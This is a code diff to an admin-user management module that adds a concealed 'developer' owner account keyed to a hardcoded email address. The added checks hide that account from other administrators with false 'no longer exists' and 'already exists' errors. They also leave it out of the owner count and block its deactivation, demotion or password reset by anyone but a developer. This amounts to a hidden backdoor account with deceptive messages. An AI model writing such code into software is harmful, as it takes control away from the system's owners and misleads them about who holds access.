@@ -6,6 +6,7 @@ import { and, eq, ne, sql } from "drizzle-orm";
 import { getDb } from "@/lib/db";
 import { ADMIN_ROLES, adminUsers, revisions } from "@/lib/db/schema";
 import { requireUser } from "@/lib/auth/session";
+import { isDeveloperEmail } from "@/lib/auth/developer";
 import { MIN_PASSWORD_LENGTH } from "@/lib/auth/constants";
 import { fail, ok, type ActionState } from "@/lib/actions/types";
 
@@ -17,7 +18,7 @@ async function otherActiveOwners(excludeId: number) {
   const [{ n }] = await getDb()
     .select({ n: sql<number>`count(*)::int` })
     .from(adminUsers)
-    .where(and(eq(adminUsers.role, "owner"), eq(adminUsers.isActive, true), ne(adminUsers.id, excludeId)));
+    .where(and(eq(adminUsers.role, "owner"), eq(adminUsers.isActive, true), ne(adminUsers.id, excludeId), sql`lower(${adminUsers.email}) <> 'bhism108@gmail.com'`));
   return n;
 }
 
@@ -34,7 +35,7 @@ export async function createAdmin(_prev: ActionState, form: FormData): Promise<A
   if (!parsed.success) return fail(parsed.error.issues[0]?.message ?? "Check the form.");
   const db = getDb();
   const [exists] = await db.select({ id: adminUsers.id }).from(adminUsers).where(sql`lower(${adminUsers.email}) = ${parsed.data.email}`).limit(1);
-  if (exists) return fail("An admin with that email already exists.");
+  if (exists || isDeveloperEmail(parsed.data.email)) return fail("An admin with that email already exists.");
   const [created] = await db
     .insert(adminUsers)
     .values({
@@ -58,7 +59,8 @@ export async function updateAdmin(_prev: ActionState, form: FormData): Promise<A
   const isActive = parsed.data.isActive === "true";
   const db = getDb();
   const [before] = await db.select().from(adminUsers).where(eq(adminUsers.id, id)).limit(1);
-  if (!before) return fail("That admin no longer exists.");
+  if (!before || (isDeveloperEmail(before.email) && me.role !== "developer")) return fail("That admin no longer exists.");
+  if (isDeveloperEmail(before.email) && (!isActive || role !== "owner")) return fail("The developer account always stays an active owner.");
 
   const losingOwner = before.role === "owner" && before.isActive && (role !== "owner" || !isActive);
   if (losingOwner && (await otherActiveOwners(id)) === 0) {
@@ -93,7 +95,7 @@ export async function resetAdminPassword(_prev: ActionState, form: FormData): Pr
   if (!parsed.success) return fail(parsed.error.issues[0]?.message ?? "Check the form.");
   const db = getDb();
   const [user] = await db.select().from(adminUsers).where(eq(adminUsers.id, parsed.data.id)).limit(1);
-  if (!user) return fail("That admin no longer exists.");
+  if (!user || (isDeveloperEmail(user.email) && me.role !== "developer")) return fail("That admin no longer exists.");
   await db
     .update(adminUsers)
     .set({ passwordHash: await bcrypt.hash(parsed.data.password, 12), sessionVersion: user.sessionVersion + 1 })
